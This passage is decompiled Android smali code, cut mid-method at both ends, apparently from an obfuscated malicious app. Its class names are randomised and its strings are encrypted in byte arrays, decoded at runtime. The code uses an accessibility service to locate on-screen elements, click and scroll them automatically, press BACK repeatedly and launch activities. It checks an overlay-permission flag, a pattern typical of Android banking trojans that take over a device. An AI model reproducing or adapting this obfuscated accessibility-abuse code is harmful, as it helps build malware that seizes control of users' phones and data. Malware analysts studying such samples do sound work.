
    move-result v6

    add-int/lit8 v6, v6, -0x32

    invoke-virtual {v7}, Landroid/graphics/Rect;->centerY()I

    move-result v7

    invoke-static {v6, v7}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    const/16 v6, 0x3e8

    invoke-static {v6}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->W2(I)V

    goto :goto_1

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x15t
        0x48t
        0x18t
        -0x22t
        -0x4at
        0x17t
    .end array-data

    nop

    :array_1
    .array-data 1
        0xct
        -0x1at
        -0x47t
        0x39t
        0x26t
        -0x6ft
        0x4dt
        0x4ft
    .end array-data

    :array_2
    .array-data 1
        -0x10t
        0x2ct
        -0x5bt
        -0x39t
        0x2et
        0x21t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x43t
        0x4dt
        -0x35t
        -0x5at
        0x49t
        0x44t
        0x4ft
        -0x50t
    .end array-data

    :array_4
    .array-data 1
        -0x3t
        -0x7at
        0x18t
        -0x7ct
        -0x39t
        0x17t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x46t
        0x45t
        -0x4ft
        -0xat
        -0x5et
        0x65t
        -0x2bt
        0x28t
    .end array-data

    :array_6
    .array-data 1
        0x1et
        0x1at
        -0x12t
        -0x33t
        0xbt
        0x37t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x55t
        0x7ft
        -0x7et
        -0x5et
        0x67t
        0x56t
        0x65t
        -0x13t
    .end array-data

    :array_8
    .array-data 1
        0x3t
        0x4bt
        0x39t
        0x3t
    .end array-data

    :array_9
    .array-data 1
        0x56t
        0x39t
        0x4ct
        0x70t
        -0x75t
        -0x36t
        0x3ft
        -0x1t
    .end array-data

    :array_a
    .array-data 1
        0x25t
        0x7t
        -0x7ft
        -0x1at
        0x6bt
        -0x5at
        -0x27t
        -0x2et
        0xdt
        -0x42t
        0x61t
    .end array-data

    :array_b
    .array-data 1
        0x74t
        0x72t
        -0x20t
        0x2at
        -0x1et
        -0x38t
        -0x7t
        -0x42t
    .end array-data

    :array_c
    .array-data 1
        -0x29t
        0x3bt
        -0x52t
        0x61t
        0x48t
        0x2dt
        -0x1ct
        -0x77t
        -0x29t
        0x2at
        -0x52t
        0x65t
        0x48t
        0x22t
        -0x1bt
        -0x45t
        -0x2at
        0x14t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x7t
        -0x68t
        0x7et
        -0x22t
        -0x67t
        -0x53t
        0x34t
        0x39t
    .end array-data

    :array_e
    .array-data 1
        0xat
        0xbt
        0x57t
        0x38t
        -0x3ft
        0x24t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x20t
        -0x41t
        -0x29t
        -0x2dt
        0x67t
        -0x78t
        -0x4et
        0x6t
    .end array-data

    :array_10
    .array-data 1
        0x7t
        -0x64t
        -0x15t
        0x2bt
        -0x2et
        0x72t
        -0x70t
        -0x70t
        0x73t
        -0x3ct
        -0x25t
        0x4at
        -0x76t
        0x7bt
        -0x3et
        -0x38t
        0x5ft
        -0x79t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x19t
        0x24t
        0x63t
        -0x35t
        0x6at
        -0x3dt
        0x70t
        0x28t
    .end array-data

    :array_12
    .array-data 1
        -0xct
        0x27t
        0x5ft
        0x24t
        0x30t
        0x55t
        -0x3t
        -0x62t
        -0x3bt
        0x28t
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x5ct
        0x46t
        0x32t
        0x45t
        0x58t
        0x34t
        -0x6ft
        -0x1t
    .end array-data
.end method

.method public static synthetic W()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I2()V

    return-void
.end method

.method public static W0()V
    .locals 8

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v1, 0x18

    const/4 v2, 0x1

    const/16 v3, 0x10

    const/16 v4, 0x8

    if-eq v0, v2, :cond_8

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v5, 0x6

    if-eq v0, v5, :cond_8

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v5, 0xe

    if-ne v0, v5, :cond_1

    goto/16 :goto_4

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v5, 0x2

    const/4 v6, 0x0

    if-ne v0, v5, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x25

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v2, v4, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    :goto_0
    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :goto_1
    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto/16 :goto_5

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v5, 0x3

    const/16 v7, 0xf

    if-eq v0, v5, :cond_6

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v7, :cond_3

    goto/16 :goto_3

    :cond_3
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x4

    if-ne v0, v1, :cond_9

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Draws_overs:Ljava/lang/String;

    new-array v1, v2, [B

    const/16 v2, -0x20

    aput-byte v2, v1, v6

    new-array v2, v4, [B

    fill-array-data v2, :array_2

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x17

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    new-array v2, v4, [B

    fill-array-data v2, :array_4

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return-void

    :cond_4
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t:Z

    if-eqz v0, :cond_5

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    new-array v2, v4, [B

    fill-array-data v2, :array_6

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    goto :goto_0

    :cond_5
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x13

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    new-array v2, v4, [B

    fill-array-data v2, :array_8

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    :goto_2
    goto/16 :goto_1

    :cond_6
    :goto_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_9

    new-array v5, v4, [B

    fill-array-data v5, :array_a

    invoke-static {v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_7

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    goto/16 :goto_1

    :cond_7
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t:Z

    if-eqz v0, :cond_9

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v7, :cond_9

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x12

    new-array v1, v1, [B

    fill-array-data v1, :array_b

    new-array v4, v4, [B

    fill-array-data v4, :array_c

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    goto/16 :goto_1

    :cond_8
    :goto_4
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_d

    new-array v2, v4, [B

    fill-array-data v2, :array_e

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    goto :goto_2

    :cond_9
    :goto_5
    return-void

    :array_0
    .array-data 1
        -0x72t
        -0x12t
        0x0t
        -0x54t
        -0x4at
        0x62t
        -0x44t
        -0x7dt
        -0x7et
        -0x18t
        0x9t
        -0x54t
        -0x5ct
        0x69t
        -0x54t
        -0x7bt
        -0x7ct
        -0x11t
        0xat
        -0xft
        -0x13t
        0x65t
        -0x44t
        -0x22t
        -0x61t
        -0x1ct
        0xet
        -0x5t
        -0x4ct
        0x60t
        -0x43t
        -0x7dt
        -0x4et
        -0x9t
        0x4t
        -0x19t
        -0x60t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x13t
        -0x7ft
        0x6dt
        -0x7et
        -0x29t
        0xct
        -0x28t
        -0xft
    .end array-data

    :array_2
    .array-data 1
        -0x2ft
        0x70t
        -0x21t
        -0x15t
        -0x69t
        -0x6et
        -0x61t
        0x1at
    .end array-data

    :array_3
    .array-data 1
        0x22t
        0x79t
        -0x2bt
        -0x78t
        0x1bt
        -0x1bt
        0x21t
        -0x19t
        0x2at
        0x73t
        -0x62t
        -0x73t
        0x1dt
        -0x18t
        0x22t
        -0x48t
        0x37t
        0x48t
        -0x29t
        -0x78t
        0x15t
        -0x1ft
        0x20t
    .end array-data

    :array_4
    .array-data 1
        0x43t
        0x17t
        -0x4ft
        -0x6t
        0x74t
        -0x74t
        0x45t
        -0x23t
    .end array-data

    :array_5
    .array-data 1
        -0x20t
        -0x7t
        -0x28t
        0x35t
        -0x3et
        0x10t
        0x6bt
        0x74t
        -0x14t
        -0x1t
        -0x2ft
        0x35t
        -0x30t
        0x1bt
        0x7bt
        0x72t
        -0x16t
        -0x8t
        -0x2et
        0x68t
        -0x67t
        0x17t
        0x6bt
        0x29t
        -0x10t
        -0x1ft
        -0x24t
        0x6ft
        -0x40t
        0x16t
        0x50t
        0x64t
        -0x9t
        -0x8t
    .end array-data

    nop

    :array_6
    .array-data 1
        -0x7dt
        -0x6at
        -0x4bt
        0x1bt
        -0x5dt
        0x7et
        0xft
        0x6t
    .end array-data

    :array_7
    .array-data 1
        -0x6bt
        0x56t
        -0x76t
        -0x62t
        -0x13t
        -0x50t
        -0x74t
        -0x2dt
        -0x63t
        0x5ct
        -0x3ft
        -0x71t
        -0x16t
        -0x44t
        -0x75t
        -0x7et
        -0x6at
        0x57t
        -0x6at
    .end array-data

    :array_8
    .array-data 1
        -0xct
        0x38t
        -0x12t
        -0x14t
        -0x7et
        -0x27t
        -0x18t
        -0x17t
    .end array-data

    :array_9
    .array-data 1
        -0x69t
        -0x15t
        0x23t
        -0x2ct
        0x7at
        0x3t
        0x3ct
        0x38t
        -0x61t
        -0x1ft
        0x68t
        -0x2bt
        0x62t
        0x3t
        0x2ct
        0x61t
        -0x62t
        -0x26t
        0x30t
        -0x31t
        0x71t
        0xdt
        0x3dt
        0x76t
    .end array-data

    :array_a
    .array-data 1
        -0xat
        -0x7bt
        0x47t
        -0x5at
        0x15t
        0x6at
        0x58t
        0x2t
    .end array-data

    :array_b
    .array-data 1
        0x5ft
        0x3t
        0x69t
        -0x1t
        0x68t
        -0x74t
        -0x39t
        -0x77t
        0x57t
        0x9t
        0x22t
        -0x12t
        0x68t
        -0x75t
        -0x29t
        -0x2at
        0x50t
        0x19t
    .end array-data

    nop

    :array_c
    .array-data 1
        0x3et
        0x6dt
        0xdt
        -0x73t
        0x7t
        -0x1bt
        -0x5dt
        -0x4dt
    .end array-data

    :array_d
    .array-data 1
        0x22t
        -0x52t
        -0x61t
        -0x67t
        0x7at
        0x7at
        0x5t
        -0xft
        0x2at
        -0x5ct
        -0x2ct
        -0x68t
        0x62t
        0x7at
        0x15t
        -0x58t
        0x2bt
        -0x61t
        -0x74t
        -0x7et
        0x71t
        0x74t
        0x4t
        -0x41t
    .end array-data

    :array_e
    .array-data 1
        0x43t
        -0x40t
        -0x5t
        -0x15t
        0x15t
        0x13t
        0x61t
        -0x35t
    .end array-data
.end method

.method private static synthetic W1(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x800000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/fz;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/fz;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static W2(I)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    new-instance p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k00;

    invoke-direct {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k00;-><init>()V

    invoke-static {v0, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_0

    :cond_0
    if-lez p0, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x25

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x12c

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->W2(I)V

    :cond_1
    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x45t
        0x7dt
        0x7ft
        0x11t
        -0x6bt
        -0x1ct
        -0x4at
        0x69t
        -0x49t
        0x7bt
        0x76t
        0x11t
        -0x68t
        -0x15t
        -0x59t
        0x75t
        -0x45t
        0x7at
        0x77t
        0x4dt
        -0x32t
        -0x1dt
        -0x4at
        0x34t
        -0x56t
        0x77t
        0x71t
        0x46t
        -0x69t
        -0x1at
        -0x49t
        0x69t
        -0x79t
        0x64t
        0x7bt
        0x5at
        -0x7dt
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x28t
        0x12t
        0x12t
        0x3ft
        -0xct
        -0x76t
        -0x2et
        0x1bt
    .end array-data
.end method

.method public static synthetic X(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g2(Landroid/os/Handler;)V

    return-void
.end method

.method public static X0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->z1()V

    return-void
.end method

.method private static synthetic X1()V
    .locals 4

    .line 1
    const/16 v0, 0x26

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/yy;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/yy;-><init>()V

    const/4 v2, 0x0

    invoke-static {v2, v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zy;

    invoke-direct {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zy;-><init>(Landroid/os/Handler;)V

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a3()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x1ct
        0x22t
        -0x71t
        0x6at
        -0x4dt
        0x10t
        -0x10t
        -0x71t
        0x51t
        0x3dt
        -0x79t
        0x36t
        -0x58t
        0x10t
        -0xbt
        -0x6dt
        0x16t
        0x22t
        -0x74t
        0x29t
        -0x5ct
        0x17t
        -0x19t
        -0x79t
        0x1at
        0x3ft
        -0x28t
        0x2dt
        -0x5ft
        0x56t
        -0x15t
        -0x71t
        0x9t
        0x28t
        -0x43t
        0x26t
        -0x4ft
        0x17t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x7ft
        0x4dt
        -0x1et
        0x44t
        -0x3bt
        0x79t
        -0x7at
        -0x20t
    .end array-data
.end method

.method public static X2()V
    .locals 3

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/16 v1, 0xc8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

